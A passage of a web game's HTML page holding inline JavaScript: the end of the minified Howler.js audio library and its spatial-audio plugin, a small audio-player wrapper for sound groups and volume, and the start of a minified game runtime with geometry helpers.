          t[a] = o.charCodeAt(a);
        d(t.buffer, e);
      } else {
        var _ = new XMLHttpRequest();
        _.open(e._xhr.method, n, !0),
          (_.withCredentials = e._xhr.withCredentials),
          (_.responseType = "arraybuffer"),
          e._xhr.headers &&
            Object.keys(e._xhr.headers).forEach(function (n) {
              _.setRequestHeader(n, e._xhr.headers[n]);
            }),
          (_.onload = function () {
            var n = (_.status + "")[0];
            if ("0" !== n && "2" !== n && "3" !== n)
              return void e._emit(
                "loaderror",
                null,
                "Failed loading audio file with status: " + _.status + "."
              );
            d(_.response, e);
          }),
          (_.onerror = function () {
            e._webAudio &&
              ((e._html5 = !0),
              (e._webAudio = !1),
              (e._sounds = []),
              delete r[n],
              e.load());
          }),
          u(_);
      }
    },
    u = function (e) {
      try {
        e.send();
      } catch (n) {
        e.onerror();
      }
    },
    d = function (e, o) {
      var t = function () {
          o._emit("loaderror", null, "Decoding audio data failed.");
        },
        a = function (e) {
          e && o._sounds.length > 0 ? ((r[o._src] = e), i(o, e)) : t();
        };
      "undefined" != typeof Promise && 1 === n.ctx.decodeAudioData.length
        ? n.ctx.decodeAudioData(e).then(a).catch(t)
        : n.ctx.decodeAudioData(e, a, t);
    },
    i = function (e, n) {
      n && !e._duration && (e._duration = n.duration),
        0 === Object.keys(e._sprite).length &&
          (e._sprite = { __default: [0, 1e3 * e._duration] }),
        "loaded" !== e._state &&
          ((e._state = "loaded"), e._emit("load"), e._loadQueue());
    },
    _ = function () {
      if (n.usingWebAudio) {
        try {
          "undefined" != typeof AudioContext
            ? (n.ctx = new AudioContext())
            : "undefined" != typeof webkitAudioContext
            ? (n.ctx = new webkitAudioContext())
            : (n.usingWebAudio = !1);
        } catch (e) {
          n.usingWebAudio = !1;
        }
        n.ctx || (n.usingWebAudio = !1);
        var e = /iP(hone|od|ad)/.test(n._navigator && n._navigator.platform),
          o =
            n._navigator &&
            n._navigator.appVersion.match(/OS (\d+)_(\d+)_?(\d+)?/),
          t = o ? parseInt(o[1], 10) : null;
        if (e && t && t < 9) {
          var r = /safari/.test(
            n._navigator && n._navigator.userAgent.toLowerCase()
          );
          n._navigator && !r && (n.usingWebAudio = !1);
        }
        n.usingWebAudio &&
          ((n.masterGain =
            void 0 === n.ctx.createGain
              ? n.ctx.createGainNode()
              : n.ctx.createGain()),
          n.masterGain.gain.setValueAtTime(
            n._muted ? 0 : n._volume,
            n.ctx.currentTime
          ),
          n.masterGain.connect(n.ctx.destination)),
          n._setup();
      }
    };
  "function" == typeof define &&
    define.amd &&
    define([], function () {
      return { Howler: n, Howl: o };
    }),
    "undefined" != typeof exports && ((exports.Howler = n), (exports.Howl = o)),
    "undefined" != typeof global
      ? ((global.HowlerGlobal = e),
        (global.Howler = n),
        (global.Howl = o),
        (global.Sound = t))
      : "undefined" != typeof window &&
        ((window.HowlerGlobal = e),
        (window.Howler = n),
        (window.Howl = o),
        (window.Sound = t));
})();
/*! Spatial Plugin */
!(function () {
  "use strict";
  (HowlerGlobal.prototype._pos = [0, 0, 0]),
    (HowlerGlobal.prototype._orientation = [0, 0, -1, 0, 1, 0]),
    (HowlerGlobal.prototype.stereo = function (e) {
      var n = this;
      if (!n.ctx || !n.ctx.listener) return n;
      for (var t = n._howls.length - 1; t >= 0; t--) n._howls[t].stereo(e);
      return n;
    }),
    (HowlerGlobal.prototype.pos = function (e, n, t) {
      var r = this;
      return r.ctx && r.ctx.listener
        ? ((n = "number" != typeof n ? r._pos[1] : n),
          (t = "number" != typeof t ? r._pos[2] : t),
          "number" != typeof e
            ? r._pos
            : ((r._pos = [e, n, t]),
              void 0 !== r.ctx.listener.positionX
                ? (r.ctx.listener.positionX.setTargetAtTime(
                    r._pos[0],
                    Howler.ctx.currentTime,
                    0.1
                  ),
                  r.ctx.listener.positionY.setTargetAtTime(
                    r._pos[1],
                    Howler.ctx.currentTime,
                    0.1
                  ),
                  r.ctx.listener.positionZ.setTargetAtTime(
                    r._pos[2],
                    Howler.ctx.currentTime,
                    0.1
                  ))
                : r.ctx.listener.setPosition(r._pos[0], r._pos[1], r._pos[2]),
              r))
        : r;
    }),
    (HowlerGlobal.prototype.orientation = function (e, n, t, r, o, i) {
      var a = this;
      if (!a.ctx || !a.ctx.listener) return a;
      var s = a._orientation;
      return (
        (n = "number" != typeof n ? s[1] : n),
        (t = "number" != typeof t ? s[2] : t),
        (r = "number" != typeof r ? s[3] : r),
        (o = "number" != typeof o ? s[4] : o),
        (i = "number" != typeof i ? s[5] : i),
        "number" != typeof e
          ? s
          : ((a._orientation = [e, n, t, r, o, i]),
            void 0 !== a.ctx.listener.forwardX
              ? (a.ctx.listener.forwardX.setTargetAtTime(
                  e,
                  Howler.ctx.currentTime,
                  0.1
                ),
                a.ctx.listener.forwardY.setTargetAtTime(
                  n,
                  Howler.ctx.currentTime,
                  0.1
                ),
                a.ctx.listener.forwardZ.setTargetAtTime(
                  t,
                  Howler.ctx.currentTime,
                  0.1
                ),
                a.ctx.listener.upX.setTargetAtTime(
                  r,
                  Howler.ctx.currentTime,
                  0.1
                ),
                a.ctx.listener.upY.setTargetAtTime(
                  o,
                  Howler.ctx.currentTime,
                  0.1
                ),
                a.ctx.listener.upZ.setTargetAtTime(
                  i,
                  Howler.ctx.currentTime,
                  0.1
                ))
              : a.ctx.listener.setOrientation(e, n, t, r, o, i),
            a)
      );
    }),
    (Howl.prototype.init = (function (e) {
      return function (n) {
        var t = this;
        return (
          (t._orientation = n.orientation || [1, 0, 0]),
          (t._stereo = n.stereo || null),
          (t._pos = n.pos || null),
          (t._pannerAttr = {
            coneInnerAngle:
              void 0 !== n.coneInnerAngle ? n.coneInnerAngle : 360,
            coneOuterAngle:
              void 0 !== n.coneOuterAngle ? n.coneOuterAngle : 360,
            coneOuterGain: void 0 !== n.coneOuterGain ? n.coneOuterGain : 0,
            distanceModel:
              void 0 !== n.distanceModel ? n.distanceModel : "inverse",
            maxDistance: void 0 !== n.maxDistance ? n.maxDistance : 1e4,
            panningModel: void 0 !== n.panningModel ? n.panningModel : "HRTF",
            refDistance: void 0 !== n.refDistance ? n.refDistance : 1,
            rolloffFactor: void 0 !== n.rolloffFactor ? n.rolloffFactor : 1,
          }),
          (t._onstereo = n.onstereo ? [{ fn: n.onstereo }] : []),
          (t._onpos = n.onpos ? [{ fn: n.onpos }] : []),
          (t._onorientation = n.onorientation ? [{ fn: n.onorientation }] : []),
          e.call(this, n)
        );
      };
    })(Howl.prototype.init)),
    (Howl.prototype.stereo = function (n, t) {
      var r = this;
      if (!r._webAudio) return r;
      if ("loaded" !== r._state)
        return (
          r._queue.push({
            event: "stereo",
            action: function () {
              r.stereo(n, t);
            },
          }),
          r
        );
      var o = void 0 === Howler.ctx.createStereoPanner ? "spatial" : "stereo";
      if (void 0 === t) {
        if ("number" != typeof n) return r._stereo;
        (r._stereo = n), (r._pos = [n, 0, 0]);
      }
      for (var i = r._getSoundIds(t), a = 0; a < i.length; a++) {
        var s = r._soundById(i[a]);
        if (s) {
          if ("number" != typeof n) return s._stereo;
          (s._stereo = n),
            (s._pos = [n, 0, 0]),
            s._node &&
              ((s._pannerAttr.panningModel = "equalpower"),
              (s._panner && s._panner.pan) || e(s, o),
              "spatial" === o
                ? void 0 !== s._panner.positionX
                  ? (s._panner.positionX.setValueAtTime(
                      n,
                      Howler.ctx.currentTime
                    ),
                    s._panner.positionY.setValueAtTime(
                      0,
                      Howler.ctx.currentTime
                    ),
                    s._panner.positionZ.setValueAtTime(
                      0,
                      Howler.ctx.currentTime
                    ))
                  : s._panner.setPosition(n, 0, 0)
                : s._panner.pan.setValueAtTime(n, Howler.ctx.currentTime)),
            r._emit("stereo", s._id);
        }
      }
      return r;
    }),
    (Howl.prototype.pos = function (n, t, r, o) {
      var i = this;
      if (!i._webAudio) return i;
      if ("loaded" !== i._state)
        return (
          i._queue.push({
            event: "pos",
            action: function () {
              i.pos(n, t, r, o);
            },
          }),
          i
        );
      if (
        ((t = "number" != typeof t ? 0 : t),
        (r = "number" != typeof r ? -0.5 : r),
        void 0 === o)
      ) {
        if ("number" != typeof n) return i._pos;
        i._pos = [n, t, r];
      }
      for (var a = i._getSoundIds(o), s = 0; s < a.length; s++) {
        var p = i._soundById(a[s]);
        if (p) {
          if ("number" != typeof n) return p._pos;
          (p._pos = [n, t, r]),
            p._node &&
              ((p._panner && !p._panner.pan) || e(p, "spatial"),
              void 0 !== p._panner.positionX
                ? (p._panner.positionX.setValueAtTime(
                    n,
                    Howler.ctx.currentTime
                  ),
                  p._panner.positionY.setValueAtTime(t, Howler.ctx.currentTime),
                  p._panner.positionZ.setValueAtTime(r, Howler.ctx.currentTime))
                : p._panner.setPosition(n, t, r)),
            i._emit("pos", p._id);
        }
      }
      return i;
    }),
    (Howl.prototype.orientation = function (n, t, r, o) {
      var i = this;
      if (!i._webAudio) return i;
      if ("loaded" !== i._state)
        return (
          i._queue.push({
            event: "orientation",
            action: function () {
              i.orientation(n, t, r, o);
            },
          }),
          i
        );
      if (
        ((t = "number" != typeof t ? i._orientation[1] : t),
        (r = "number" != typeof r ? i._orientation[2] : r),
        void 0 === o)
      ) {
        if ("number" != typeof n) return i._orientation;
        i._orientation = [n, t, r];
      }
      for (var a = i._getSoundIds(o), s = 0; s < a.length; s++) {
        var p = i._soundById(a[s]);
        if (p) {
          if ("number" != typeof n) return p._orientation;
          (p._orientation = [n, t, r]),
            p._node &&
              (p._panner ||
                (p._pos || (p._pos = i._pos || [0, 0, -0.5]), e(p, "spatial")),
              void 0 !== p._panner.orientationX
                ? (p._panner.orientationX.setValueAtTime(
                    n,
                    Howler.ctx.currentTime
                  ),
                  p._panner.orientationY.setValueAtTime(
                    t,
                    Howler.ctx.currentTime
                  ),
                  p._panner.orientationZ.setValueAtTime(
                    r,
                    Howler.ctx.currentTime
                  ))
                : p._panner.setOrientation(n, t, r)),
            i._emit("orientation", p._id);
        }
      }
      return i;
    }),
    (Howl.prototype.pannerAttr = function () {
      var n,
        t,
        r,
        o = this,
        i = arguments;
      if (!o._webAudio) return o;
      if (0 === i.length) return o._pannerAttr;
      if (1 === i.length) {
        if ("object" != typeof i[0])
          return (
            (r = o._soundById(parseInt(i[0], 10))),
            r ? r._pannerAttr : o._pannerAttr
          );
        (n = i[0]),
          void 0 === t &&
            (n.pannerAttr ||
              (n.pannerAttr = {
                coneInnerAngle: n.coneInnerAngle,
                coneOuterAngle: n.coneOuterAngle,
                coneOuterGain: n.coneOuterGain,
                distanceModel: n.distanceModel,
                maxDistance: n.maxDistance,
                refDistance: n.refDistance,
                rolloffFactor: n.rolloffFactor,
                panningModel: n.panningModel,
              }),
            (o._pannerAttr = {
              coneInnerAngle:
                void 0 !== n.pannerAttr.coneInnerAngle
                  ? n.pannerAttr.coneInnerAngle
                  : o._coneInnerAngle,
              coneOuterAngle:
                void 0 !== n.pannerAttr.coneOuterAngle
                  ? n.pannerAttr.coneOuterAngle
                  : o._coneOuterAngle,
              coneOuterGain:
                void 0 !== n.pannerAttr.coneOuterGain
                  ? n.pannerAttr.coneOuterGain
                  : o._coneOuterGain,
              distanceModel:
                void 0 !== n.pannerAttr.distanceModel
                  ? n.pannerAttr.distanceModel
                  : o._distanceModel,
              maxDistance:
                void 0 !== n.pannerAttr.maxDistance
                  ? n.pannerAttr.maxDistance
                  : o._maxDistance,
              refDistance:
                void 0 !== n.pannerAttr.refDistance
                  ? n.pannerAttr.refDistance
                  : o._refDistance,
              rolloffFactor:
                void 0 !== n.pannerAttr.rolloffFactor
                  ? n.pannerAttr.rolloffFactor
                  : o._rolloffFactor,
              panningModel:
                void 0 !== n.pannerAttr.panningModel
                  ? n.pannerAttr.panningModel
                  : o._panningModel,
            }));
      } else 2 === i.length && ((n = i[0]), (t = parseInt(i[1], 10)));
      for (var a = o._getSoundIds(t), s = 0; s < a.length; s++)
        if ((r = o._soundById(a[s]))) {
          var p = r._pannerAttr;
          p = {
            coneInnerAngle:
              void 0 !== n.coneInnerAngle ? n.coneInnerAngle : p.coneInnerAngle,
            coneOuterAngle:
              void 0 !== n.coneOuterAngle ? n.coneOuterAngle : p.coneOuterAngle,
            coneOuterGain:
              void 0 !== n.coneOuterGain ? n.coneOuterGain : p.coneOuterGain,
            distanceModel:
              void 0 !== n.distanceModel ? n.distanceModel : p.distanceModel,
            maxDistance:
              void 0 !== n.maxDistance ? n.maxDistance : p.maxDistance,
            refDistance:
              void 0 !== n.refDistance ? n.refDistance : p.refDistance,
            rolloffFactor:
              void 0 !== n.rolloffFactor ? n.rolloffFactor : p.rolloffFactor,
            panningModel:
              void 0 !== n.panningModel ? n.panningModel : p.panningModel,
          };
          var c = r._panner;
          c
            ? ((c.coneInnerAngle = p.coneInnerAngle),
              (c.coneOuterAngle = p.coneOuterAngle),
              (c.coneOuterGain = p.coneOuterGain),
              (c.distanceModel = p.distanceModel),
              (c.maxDistance = p.maxDistance),
              (c.refDistance = p.refDistance),
              (c.rolloffFactor = p.rolloffFactor),
              (c.panningModel = p.panningModel))
            : (r._pos || (r._pos = o._pos || [0, 0, -0.5]), e(r, "spatial"));
        }
      return o;
    }),
    (Sound.prototype.init = (function (e) {
      return function () {
        var n = this,
          t = n._parent;
        (n._orientation = t._orientation),
          (n._stereo = t._stereo),
          (n._pos = t._pos),
          (n._pannerAttr = t._pannerAttr),
          e.call(this),
          n._stereo
            ? t.stereo(n._stereo)
            : n._pos && t.pos(n._pos[0], n._pos[1], n._pos[2], n._id);
      };
    })(Sound.prototype.init)),
    (Sound.prototype.reset = (function (e) {
      return function () {
        var n = this,
          t = n._parent;
        return (
          (n._orientation = t._orientation),
          (n._stereo = t._stereo),
          (n._pos = t._pos),
          (n._pannerAttr = t._pannerAttr),
          n._stereo
            ? t.stereo(n._stereo)
            : n._pos
            ? t.pos(n._pos[0], n._pos[1], n._pos[2], n._id)
            : n._panner &&
              (n._panner.disconnect(0),
              (n._panner = void 0),
              t._refreshBuffer(n)),
          e.call(this)
        );
      };
    })(Sound.prototype.reset));
  var e = function (e, n) {
    (n = n || "spatial"),
      "spatial" === n
        ? ((e._panner = Howler.ctx.createPanner()),
          (e._panner.coneInnerAngle = e._pannerAttr.coneInnerAngle),
          (e._panner.coneOuterAngle = e._pannerAttr.coneOuterAngle),
          (e._panner.coneOuterGain = e._pannerAttr.coneOuterGain),
          (e._panner.distanceModel = e._pannerAttr.distanceModel),
          (e._panner.maxDistance = e._pannerAttr.maxDistance),
          (e._panner.refDistance = e._pannerAttr.refDistance),
          (e._panner.rolloffFactor = e._pannerAttr.rolloffFactor),
          (e._panner.panningModel = e._pannerAttr.panningModel),
          void 0 !== e._panner.positionX
            ? (e._panner.positionX.setValueAtTime(
                e._pos[0],
                Howler.ctx.currentTime
              ),
              e._panner.positionY.setValueAtTime(
                e._pos[1],
                Howler.ctx.currentTime
              ),
              e._panner.positionZ.setValueAtTime(
                e._pos[2],
                Howler.ctx.currentTime
              ))
            : e._panner.setPosition(e._pos[0], e._pos[1], e._pos[2]),
          void 0 !== e._panner.orientationX
            ? (e._panner.orientationX.setValueAtTime(
                e._orientation[0],
                Howler.ctx.currentTime
              ),
              e._panner.orientationY.setValueAtTime(
                e._orientation[1],
                Howler.ctx.currentTime
              ),
              e._panner.orientationZ.setValueAtTime(
                e._orientation[2],
                Howler.ctx.currentTime
              ))
            : e._panner.setOrientation(
                e._orientation[0],
                e._orientation[1],
                e._orientation[2]
              ))
        : ((e._panner = Howler.ctx.createStereoPanner()),
          e._panner.pan.setValueAtTime(e._stereo, Howler.ctx.currentTime)),
      e._panner.connect(e._node),
      e._paused || e._parent.pause(e._id, !0).play(e._id, !0);
  };
})();

globalThis.HowlerAudioPlayer = {
  audioStore: {},
  loadedAudio: {},
  paused: {},
  volumes: {},
  muted: {},
  init(runtime) {
    this.runtime = runtime;
  },

  dbToLinear(x) {
    var v = this.dbToLinear_nocap(x);

    if (!isFinite(v))
      // accidentally passing a string can result in NaN; set volume to 0 if so
      v = 0;

    if (v <= 0.0011) v = 0;
    if (v > 1) v = 1;
    return v;
  },

  linearToDb(x) {
    if (x < 0.001) x = 0.001;
    if (x > 1) x = 1;
    return this.linearToDb_nocap(x);
  },

  dbToLinear_nocap(x) {
    return Math.pow(10, x / 20);
  },

  linearToDb_nocap(x) {
    return (Math.log(x) / Math.log(10)) * 20;
  },

  play(name, group = "sounds") {
    //if sound has already been played before, reuse it, else create new Howler.
    let howler;
    this.audioStore[group] = this.audioStore[group] || {};
    if (this.audioStore[group][name]) howler = this.audioStore[group][name];
    else if (this.loadedAudio[name]) {
      howler = this.audioStore[group][name] = this.loadedAudio[name];
      delete this.loadedAudio[name];
    } else howler = this.load(name, group);

    howler.volume(this.volumes[group] || 1);
    howler.mute(!!this.muted[group]);
    howler.play();
  },
  setPaused(paused = true, group) {
    if (group) {
      if (paused) {
        if (!this.audioStore.hasOwnProperty(group)) return;
        this.paused[group] = this.paused[group] || {};
        Object.keys(this.audioStore[group]).forEach((name) => {
          this.paused[group][name] = this.paused[group][name] || [];
          let self = this.audioStore[group][name];
          for (var i = 0; i < self._sounds.length; i++) {
            let sound = self._sounds[i];
            if (!sound._paused && !sound._ended) {
              this.paused[group][name].push(sound._id);
              self.pause(sound._id);
            }
          }
        });
      } else {
        if (!this.paused.hasOwnProperty(group)) return;
        if (!this.audioStore.hasOwnProperty(group)) return;
        Object.keys(this.paused[group]).forEach((name) => {
          if (!this.audioStore[group].hasOwnProperty(name)) return;
          let ids = this.paused[group][name];
          ids.forEach((id) => {
            this.audioStore[group][name].play(id);
          });
          this.paused[group][name] = [];
        });
      }
    } else {
      if (paused) {
        let arr = Object.keys(this.audioStore);
        for (let i = 0; i < arr.length; i++) {
          const groupName = arr[i];
          this.setPaused(true, groupName);
        }
      } else {
        let arr = Object.keys(this.paused);
        for (let i = 0; i < arr.length; i++) {
          const groupName = arr[i];
          this.setPaused(false, groupName);
        }
      }
    }
  },
  setMuted(muted = true, group) {
    if (group) {
      if (!this.audioStore.hasOwnProperty(group)) return;
      this.muted[group] = muted;
      Object.values(this.audioStore[group]).forEach((howl) => {
        howl.mute(muted);
      });
    } else {
      Howler.mute(muted);
    }
  },
  setLooping(looping = true, group) {
    if (group) {
      if (!this.audioStore.hasOwnProperty(group)) return;
      Object.values(this.audioStore[group]).forEach((howl) => {
        howl.loop(looping);
      });
    } else {
      let arr = Object.keys(this.audioStore);
      for (let i = 0; i < arr.length; i++) {
        const groupName = arr[i];
        this.setLooping(looping, groupName);
      }
    }
  },
  setVolume(volume, group) {
    volume = this.dbToLinear(volume);
    this.setLinearVolume(volume, group);
  },
  setLinearVolume(volume, group) {
    if (group) {
      if (!this.audioStore.hasOwnProperty(group)) return;
      this.volumes[group] = volume;
      Object.values(this.audioStore[group]).forEach((howl) => {
        howl.volume(volume);
      });
    } else {
      Howler.volume(volume);
    }
  },
  stop(group) {
    if (group) {
      if (!this.audioStore.hasOwnProperty(group)) return;

      if (this.paused.hasOwnProperty(group)) {
        this.paused[group] = {};
      }

      Object.values(this.audioStore[group]).forEach((howl) => {
        howl.stop();
      });
    } else {
      this.paused = {};
      Howler.stop();
    }
  },
  unload(name, group) {
    if (name) {
      if (group) {
        if (this.audioStore[group] && this.audioStore[group][name])
          this.audioStore[group][name].unload();
      } else {
        Object.values(this.audioStore).forEach((group) => {
          if (group[name]) group[name].unload();
        });
      }
    } else {
      Howler.unload();
    }
  },
  load(name, group) {
    let fullName = this.runtime.files_subfolder + name.toLowerCase();
    if (group) {
      this.audioStore[group] = this.audioStore[group] || {};
      if (!this.audioStore[group][name]) {
        this.audioStore[group][name] = new Howl({
          src: [fullName + ".ogg", fullName + ".m4a"],
        });
      }
      return this.audioStore[group][name];
    } else {
      if (this.loadedAudio[name]) return;
      this.loadedAudio[name] = new Howl({
        src: [fullName + ".ogg", fullName + ".m4a"],
      });
    }
  },
  isPlaying(group) {
    if (group) {
      if (!this.audioStore.hasOwnProperty(group)) return false;
      let arr = Object.values(this.audioStore[group]);
      for (let i = 0; i < arr.length; i++) {
        const howl = arr[i];
        if (howl.playing()) return true;
      }
      return false;
    } else {
      let arr = Object.keys(this.audioStore);
      for (let i = 0; i < arr.length; i++) {
        const groupName = arr[i];
        if (this.isPlaying(groupName)) return true;
      }
      return false;
    }
  },
  getVolume(group) {
    if (group) {
      return this.linearToDb(this.volumes[group] || 1);
    } else {
      return this.linearToDb(Howler.volume());
    }
  },
  getLinearVolume(group) {
    if (group) {
      return this.volumes[group] || 1;
    } else {
      return Howler.volume();
    }
  },
};
</script>

	
    <!-- The runtime script.  You can rename it, but don't forget to rename the reference here as well.
    This file will have been minified and obfuscated if you enabled "Minify script" during export. -->
	<script>
var cr={plugins_:{},behaviors:{}};"function"!=typeof Object.getPrototypeOf&&(Object.getPrototypeOf="object"==typeof"test".__proto__?function(t){return t.__proto__}:function(t){return t.constructor.prototype}),function(){function t(t,e){this.x=t,this.y=e,cr.seal(this)}function e(t,e,i,s){this.set(t,e,i,s),cr.seal(this)}function i(){this.tlx=0,this.tly=0,this.trx=0,this.try_=0,this.brx=0,this.bry=0,this.blx=0,this.bly=0,cr.seal(this)}cr.logexport=function(t){window.console&&window.console.log&&window.console.log(t)},cr.logerror=function(t){window.console&&window.console.error&&window.console.error(t)},cr.seal=function(t){return t},cr.freeze=function(t){return t},cr.is_undefined=function(t){return void 0===t},cr.is_number=function(t){return"number"==typeof t},cr.is_string=function(t){return"string"==typeof t},cr.isPOT=function(t){return 0<t&&0==(t-1&t)},cr.nextHighestPowerOfTwo=function(t){--t;for(var e=1;e<32;e<<=1)t|=t>>e;return t+1},cr.abs=function(t){return t<0?-t:t},cr.max=function(t,e){return e<t?t:e},cr.min=function(t,e){return t<e?t:e},cr.PI=Math.PI,cr.round=function(t){return t+.5|0},cr.floor=function(t){return 0<=t?0|t:(0|t)-1},cr.ceil=function(t){var e=0|t;return e===t?e:1+e},t.prototype.offset=function(t,e){return this.x+=t,this.y+=e,this},t.prototype.mul=function(t,e){return this.x*=t,this.y*=e,this},cr.vector2=t,cr.segments_intersect=function(t,e,i,s,n,r,o,a){var h,c,l=t<i?(p=t,i):(p=i,t),u=n<o?(h=n,o):(h=o,n);if(l<h||u<p)return!1;if(p=r<a?(c=r,a):(c=a,r),(e<s?(d=e,s):(d=s,e))<c||p<d)return!1;var p=n-t+o-i,d=r-e+a-s,t=i-t,e=s-e,n=o-n,a=a-r,r=cr.abs(e*n-a*t),a=n*d-a*p;if(cr.abs(a)>r)return!1;p=t*d-e*p;return cr.abs(p)<=r},e.prototype.set=function(t,e,i,s){this.left=t,this.top=e,this.right=i,this.bottom=s},e.prototype.copy=function(t){this.left=t.left,this.top=t.top,this.right=t.right,this.bottom=t.bottom},e.prototype.width=function(){return this.right-this.left},e.prototype.height=function(){return this.bottom-this.top},e.prototype.offset=function(t,e){return this.left+=t,this.top+=e,this.right+=t,this.bottom+=e,this},e.prototype.normalize=function(){var t=0;this.left>this.right&&(t=this.left,this.left=this.right,this.right=t),this.top>this.bottom&&(t=this.top,this.top=this.bottom,this.bottom=t)},e.prototype.intersects_rect=function(t){return!(t.right<this.left||t.bottom<this.top||t.left>this.right||t.top>this.bottom)},e.prototype.intersects_rect_off=function(t,e,i){return!(t.right+e<this.left||t.bottom+i<this.top||t.left+e>this.right||t.top+i>this.bottom)},e.prototype.contains_pt=function(t,e){return t>=this.left&&t<=this.right&&e>=this.top&&e<=this.bottom},e.prototype.equals=function(t){return this.left===t.left&&this.top===t.top&&this.right===t.right&&this.bottom===t.bottom},cr.rect=e,i.prototype.set_from_rect=function(t){this.tlx=t.left,this.tly=t.top,this.trx=t.right,this.try_=t.top,this.brx=t.right,this.bry=t.bottom,this.blx=t.left,this.bly=t.bottom},i.prototype.set_from_rotated_rect=function(t,e){var i,s,n,r,o,a,h;0===e?this.set_from_rect(t):(a=Math.sin(e),h=Math.cos(e),i=t.left*a,s=t.top*a,n=t.right*a,r=t.bottom*a,o=t.left*h,e=t.top*h,a=t.right*h,h=t.bottom*h,this.tlx=o-s,this.tly=e+i,this.trx=a-s,this.try_=e+n,this.brx=a-r,this.bry=h+n,this.blx=o-r,this.bly=h+i)},i.prototype.offset=function(t,e){return this.tlx+=t,this.tly+=e,this.trx+=t,this.try_+=e,this.brx+=t,this.bry+=e,this.blx+=t,this.bly+=e,this};var n=0,r=0;function s(t,e,i,s){r=t<e?i<s?(n=t<i?t:i,s<e?e:s):(n=t<s?t:s,i<e?e:i):i<s?(n=e<i?e:i,s<t?t:s):(n=e<s?e:s,i<t?t:i)}i.prototype.bounding_box=function(t){s(this.tlx,this.trx,this.brx,this.blx),t.left=n,t.right=r,s(this.tly,this.try_,this.bry,this.bly),t.top=n,t.bottom=r},i.prototype.contains_pt=function(t,e){var i=this.tlx,s=this.tly,n=this.trx-i,r=this.try_-s,o=this.brx-i,a=this.bry-s,h=t-i,c=e-s,l=n*n+r*r,u=n*o+r*a,p=n*h+r*c,d=o*o+a*a,g=o*h+a*c,f=1/(l*d-u*u),t=(d*p-u*g)*f,e=(l*g-u*p)*f;if(0<=t&&0<e&&t+e<1)return!0;e=((l=(n=this.blx-i)*n+(r=this.bly-s)*r)*g-(u=n*o+r*a)*(p=n*h+r*c))*(f=1/(l*d-u*u));return 0<=(t=(d*p-u*g)*f)&&0<e&&t+e<1},i.prototype.at=function(t,e){if(e)switch(t){case 0:return this.tlx;case 1:return this.trx;case 2:return this.brx;case 3:return this.blx;case 4:default:return this.tlx}else switch(t){case 0:return this.tly;case 1:return this.try_;case 2:return this.bry;case 3:return this.bly;case 4:default:return this.tly}},i.prototype.midX=function(){return(this.tlx+this.trx+this.brx+this.blx)/4},i.prototype.midY=function(){return(this.tly+this.try_+this.bry+this.bly)/4},i.prototype.intersects_segment=function(t,e,i,s){if(this.contains_pt(t,e)||this.contains_pt(i,s))return!0;for(var n,r,o,a,h=0;h<4;h++)if(n=this.at(h,!0),r=this.at(h,!1),o=this.at(h+1,!0),a=this.at(h+1,!1),cr.segments_intersect(t,e,i,s,n,r,o,a))return!0;return!1},i.prototype.intersects_quad=function(t){var e,i,s,n,r,o,a,h,c,l,u=t.midX(),p=t.midY();if(this.contains_pt(u,p))return!0;if(u=this.midX(),p=this.midY(),t.contains_pt(u,p))return!0;for(c=0;c<4;c++)for(l=0;l<4;l++)if(e=this.at(c,!0),i=this.at(c,!1),s=this.at(c+1,!0),n=this.at(c+1,!1),r=t.at(l,!0),o=t.at(l,!1),a=t.at(l+1,!0),h=t.at(l+1,!1),cr.segments_intersect(e,i,s,n,r,o,a,h))return!0;return!1},cr.quad=i,cr.RGB=function(t,e,i){return Math.max(Math.min(t,255),0)|Math.max(Math.min(e,255),0)<<8|Math.max(Math.min(i,255),0)<<16},cr.GetRValue=function(t){return 255&t},cr.GetGValue=function(t){return(65280&t)>>8},cr.GetBValue=function(t){return(16711680&t)>>16},cr.shallowCopy=function(t,e,i){for(var s in e)e.hasOwnProperty(s)&&(t[s]=e[s]);return t},cr.arrayRemove=function(t,e){var i,s;if(!((e=cr.floor(e))<0||e>=t.length)){for(i=e,s=t.length-1;i<s;i++)t[i]=t[i+1];cr.truncateArray(t,s)}},cr.truncateArray=function(t,e){t.length=e},cr.clearArray=function(t){cr.truncateArray(t,0)},cr.shallowAssignArray=function(t,e){var i,s;for(cr.clearArray(t),i=0,s=e.length;i<s;++i)t[i]=e[i]},cr.appendArray=function(t,e){t.push.apply(t,e)},cr.fastIndexOf=function(t,e){for(var i=0,s=t.length;i<s;++i)if(t[i]===e)return i;return-1},cr.arrayFindRemove=function(t,e){e=cr.fastIndexOf(t,e);-1!==e&&cr.arrayRemove(t,e)},cr.clamp=function(t,e,i){return t<e?e:i<t?i:t},cr.to_radians=function(t){return t/(180/cr.PI)},cr.to_degrees=function(t){return t*(180/cr.PI)},cr.clamp_angle_degrees=function(t){return(t%=360)<0&&(t+=360),t},cr.clamp_angle=function(t){return(t%=2*cr.PI)<0&&(t+=2*cr.PI),t},cr.to_clamped_degrees=function(t){return cr.clamp_angle_degrees(cr.to_degrees(t))},cr.to_clamped_radians=function(t){return cr.clamp_angle(cr.to_radians(t))},cr.angleTo=function(t,e,i,s){t=i-t,e=s-e;return Math.atan2(e,t)},cr.angleDiff=function(t,e){if(t===e)return 0;var i=Math.sin(t),t=Math.cos(t),e=i*Math.sin(e)+t*Math.cos(e);return 1<=e?0:e<=-1?cr.PI:Math.acos(e)},cr.angleRotate=function(t,e,i){var s=Math.sin(t),n=Math.cos(t),r=Math.sin(e),o=Math.cos(e);return Math.acos(s*r+n*o)>i?0<n*r-s*o?cr.clamp_angle(t+i):cr.clamp_angle(t-i):cr.clamp_angle(e)},cr.angleClockwise=function(t,e){var i=Math.sin(t);return Math.cos(t)*Math.sin(e)-i*Math.cos(e)<=0},cr.rotatePtAround=function(t,e,i,s,n,r){if(0===i)return r?t:e;var o=Math.sin(i),a=Math.cos(i),i=(t-=s)*o;return t=t*a-(e-=n)*o,e=e*a+i,t+=s,e+=n,r?t:e},cr.distanceTo=function(t,e,i,s){t=i-t,e=s-e;return Math.sqrt(t*t+e*e)},cr.xor=function(t,e){return!t!=!e},cr.lerp=function(t,e,i){return t+(e-t)*i},cr.unlerp=function(t,e,i){return t===e?0:(i-t)/(e-t)},cr.anglelerp=function(t,e,i){var s=cr.angleDiff(t,e);return cr.angleClockwise(e,t)?t+s*i:t-s*i},cr.qarp=function(t,e,i,s){return cr.lerp(cr.lerp(t,e,s),cr.lerp(e,i,s),s)},cr.cubic=function(t,e,i,s,n){return cr.lerp(cr.qarp(t,e,i,n),cr.qarp(e,i,s,n),n)},cr.cosp=function(t,e,i){return(t+e+(t-e)*Math.cos(i*Math.PI))/2},cr.hasAnyOwnProperty=function(t){for(var e in 